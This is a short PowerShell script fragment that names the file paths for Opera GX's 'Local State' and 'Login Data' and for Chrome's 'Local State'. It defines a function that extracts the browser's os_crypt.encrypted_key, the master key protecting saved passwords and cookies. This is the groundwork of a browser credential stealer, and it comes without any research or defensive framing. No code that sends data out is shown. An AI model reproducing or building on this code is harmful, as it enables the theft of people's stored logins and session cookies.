# Specify the path to the Local State file
$localStateFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Local State"
$loginDataFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
$CHROME_PATH_LOCAL_STATE = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$CHROME_PATH = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"


function Get-Key {
    Param(
        [Parameter(Mandatory = $true)]
        [string]$path
        )
    # Check if the file exists
    if (Test-Path -Path $path) {
        # Read the content of the Local State file
        $content = Get-Content -Path $path -Raw

        # Convert JSON content to PowerShell object
        $jsonObject = $content | ConvertFrom-Json

        # Specify the key you want to retrieve

        # Check if the key exists in the JSON object
        if ($jsonObject.os_crypt.encrypted_key) {
            # Output the value of the specified key
            return $jsonObject.os_crypt.encrypted_key
        } else {
            Write-Output "Key '$desiredKey' not found in the JSON object."
        }
    } else {
        Write-Output "Local State file not found."
    }
}
